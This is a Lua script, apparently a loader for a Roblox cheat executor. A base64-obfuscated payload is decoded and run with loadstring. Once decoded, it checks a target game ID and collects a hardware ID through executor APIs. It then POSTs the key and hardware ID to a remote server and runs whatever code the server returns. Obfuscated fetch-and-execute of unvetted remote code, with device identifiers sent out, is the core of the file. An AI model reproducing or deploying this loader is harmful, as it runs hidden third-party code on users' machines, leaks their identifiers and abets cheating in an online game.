local _p = "bG9jYWwgVEFSR0VUX1BMQUNFX0lEID0gMTc2MjUzNTk5NjIKCmlmIGdhbWUuUGxhY2VJZCB+PSBUQVJHRVRfUExBQ0VfSUQgdGhlbgogICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXI6S2ljaygiW01pbmVtaW55ZWVdIFNlY3VyaXR5IEVycm9yOiBBY2Nlc3MgRGVuaWVkIGZvciB0aGlzIGdhbWUuIik7CiAgICByZXR1cm47CmVuZAoKaWYgbm90IHNjcmlwdF9rZXkgb3Igc2NyaXB0X2tleSA9PSAiIiB0aGVuCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcjpLaWNrKCJbTWluZW1pbnllZV0gRXJyb3I6IFNjcmlwdCBrZXkgaXMgbWlzc2luZy4iKTsKICAgIHJldHVybjsKZW5kCgpsb2NhbCBod2lkID0gIlVua25vd24iOwppZiBzeW4gYW5kIHN5bi5nZXRfaHdpZCB0aGVuCiAgICBod2lkID0gc3luLmdldF9od2lkKCk7CmVsc2VpZiBnZXRod2lkIHRoZW4KICAgIGh3aWQgPSBnZXRod2lkKCk7CmVsc2VpZiBGbHV4dXMgYW5kIEZsdXh1cy5nZXRfaHdpZCB0aGVuCiAgICBod2lkID0gRmx1eHVzLmdldF9od2lkKCk7CmVsc2VpZiBpZGVudGlmeWV4ZWN1dG9yIHRoZW4KICAgIGxvY2FsIGV4ZWNOYW1lID0gaWRlbnRpZnlleGVjdXRvcigpOwogICAgaWYgZXhlY05hbWUgPT0gIkRlbHRhIiBvciBleGVjTmFtZSA9PSAiSHlkcm9nZW4iIHRoZW4KICAgICAgICBod2lkID0gZXhlY05hbWUgLi4gIl8iIC4uIChnZXRjdXN0b21hc3NldCBhbmQgInNlY3VyZSIgb3IgInN0YW5kYXJkIik7CiAgICBlbmQKZW5kCgppZiBub3QgaHdpZCBvciBod2lkID09ICJVbmtub3duIiBvciBod2lkID09ICIiIHRoZW4KICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyOktpY2soIltNaW5lbWlueWVlXSBTZWN1cml0eSBFcnJvcjogQ291bGQgbm90IHZlcmlmeSBoYXJkd2FyZSBJRC4iKTsKICAgIHJldHVybjsKZW5kCgpsb2NhbCBzdWNjZXNzLCByZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgIHJldHVybiByZXF1ZXN0KHsKICAgICAgICBVcmwgPSAiaHR0cDovL2x1YS1zY3JpcHRsdWFybW9yLmtyby5rcjo1MDAwL2xvYWRlci5sdWEiLAogICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICBIZWFkZXJzID0geyBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iIH0sCiAgICAgICAgQm9keSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKTpKU09ORW5jb2RlKHsga2V5ID0gc2NyaXB0X2tleSwgaHdpZCA9IGh3aWQgfSkKICAgIH0pCmVuZCk7CgppZiBzdWNjZXNzIGFuZCByZXNwb25zZSBhbmQgcmVzcG9uc2UuU3RhdHVzQ29kZSA9PSAyMDAgdGhlbgogICAgbG9jYWwgbG9hZEZ1bmMsIGVyciA9IGxvYWRzdHJpbmcocmVzcG9uc2UuQm9keSk7CiAgICBpZiBsb2FkRnVuYyB0aGVuCiAgICAgICAgbG9hZEZ1bmMoKTsKICAgIGVsc2UKICAgICAgICB3YXJuKCJbTWluZW1pbnllZV0gQ29tcGlsYXRpb24gRXJyb3I6ICIgLi4gdG9zdHJpbmcoZXJyKSk7CiAgICBlbmQKZWxzZQogICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXI6S2ljaygiW01pbmVtaW55ZWVdIEF1dGhlbnRpY2F0aW9uIEZhaWxlZCBvciBTZXJ2ZXIgT2ZmbGluZS4iKTsKZW5k";
local function _d(b)
    local c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    b=string.gsub(b, '[^'..c..'=]', '')
    return (b:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(c:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local t=0 for i=1,8 do t=t+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(t)
    end))
end
local f, e = loadstring(_d(_p));
if f then f(); else warn("Loader Error: " .. tostring(e)); end
